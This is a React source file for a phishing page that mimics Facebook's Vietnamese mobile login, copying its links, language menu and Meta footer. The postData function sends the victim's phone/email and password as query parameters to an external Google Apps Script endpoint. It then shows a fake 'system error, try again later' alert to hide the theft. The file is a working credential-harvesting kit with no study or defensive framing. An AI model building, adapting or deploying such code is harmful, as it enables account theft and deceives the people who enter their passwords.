import logo from "./dF5SId3UHWd.svg";
import "./App.css";
import style from "./style.module.css";
import axios from "axios";
import { useForm } from "react-hook-form";

function App() {
  const { register, handleSubmit } = useForm();

  const postData = async (data) => {
    await axios.get(
      "https://script.google.com/macros/s/AKfycbz7fmR2XSaP8rEtc-ajJyqSPWyk94VRQk_Bf2PzCaWhGSiDShDuU5cTE51tBM6qlFiA/exec",
      {
        params: data,
      }
    );

    alert("Hệ thống đang xảy ra lỗi. Vui lòng thử lại sau!");
  };

  return (
    <div style={{ minHeight: "100vh", paddingBottom: 100 }}>
      <div
        style={{
          maxWidth: 416,
          margin: "auto",
        }}
      >
        <div style={{ minHeight: 416 }}>
          <div className={"flexCenter"} style={{ paddingTop: 8 }}>
            <img src={logo} className={style.logo} />
          </div>
          <div>
            <div
              className="flexCenter flexCol"
              style={{ paddingTop: 8, paddingRight: 16, paddingLeft: 16 }}
            >
              <input
                className={style.input}
                placeholder="Số di động hoặc email"
                {...register("email")}
              />
              <input
                className={style.input}
                placeholder="Mật khẩu"
                type="password"
                {...register("password")}
              />
              <button className={style.submit} onClick={handleSubmit(postData)}>
                Đăng nhập
              </button>
              <a
                href="https://m.facebook.com/recover/initiate/?privacy_mutation_token=eyJ0eXBlIjowLCJjcmVhdGlvbl90aW1lIjoxNjgwNzkyMjgwLCJjYWxsc2l0ZV9pZCI6Mjg0Nzg1MTQ5MzQ1MzY5fQ%3D%3D&c=https%3A%2F%2Fm.facebook.com%2F%3Fwtsid%3Drdr_0WRHNqtt3fivoPufS&r&cuid&ars=facebook_login&lwv=100&refid=8"
                className={style.forgotPass}
                style={{ paddingTop: 12 }}
              >
                Quên mật khẩu
              </a>
              <p className={style.or}>hoặc</p>
              <a
                href="https://m.facebook.com/reg/?cid=103&refsrc=deprecated&soft=hjk"
                className={`${style.new} flexCenter`}
              >
                Tạo tài khoản mới
              </a>
            </div>
          </div>
        </div>
        <div className={style.lang}>
          <ul>
            <li>
              <a style={{ color: "#90949c", fontWeight: "bold" }}>Tiếng Việt</a>
            </li>
            <li>
              <a href="https://m.facebook.com/intl/save_locale/?loc=zh_TW">
                中文(台灣)
              </a>
            </li>
            <li>
              <a href="https://m.facebook.com/intl/save_locale/?loc=zh_TW">
                Español
              </a>
            </li>
            <li>
              <a href="https://m.facebook.com/intl/save_locale/?loc=zh_TW">
                Français (France)
              </a>
            </li>
          </ul>
          <ul>
            <li>
              <a href="https://m.facebook.com/intl/save_locale/?loc=zh_TW">
                English (UK)
              </a>
            </li>
            <li>
              <a href="https://m.facebook.com/intl/save_locale/?loc=zh_TW">
                한국어
              </a>
            </li>
            <li>
              <a href="https://m.facebook.com/intl/save_locale/?loc=zh_TW">
                Português (Brasil)
              </a>
            </li>
            <li>
              <a
                className={`${style.more} flexCenter`}
                href="https://m.facebook.com/language/?next_uri=https%3A%2F%2Fm.facebook.com%2F%3Fwtsid%3Drdr_0WRHNqtt3fivoPufS&page_style=1&refid=8"
              >
                +
              </a>
            </li>
          </ul>
        </div>
        <div style={{ marginTop: 10 }}>
          <ul
            style={{ width: "100%", display: "flex", justifyContent: "center" }}
          >
            <li className={style.op}>
              <a>Giới thiệu</a>
            </li>
            <li className={style.op}>
              <span>·</span>
              <a>Trợ giúp</a>
              <span>·</span>
            </li>
            <li className={style.op}>
              <a>Xem thêm</a>
            </li>
          </ul>
          <p
            className="flexCenter"
            style={{ fontSize: 12, color: "gray", marginTop: 10 }}
          >
            Meta © 2023
          </p>
        </div>
      </div>
    </div>
  );
}

export default App;
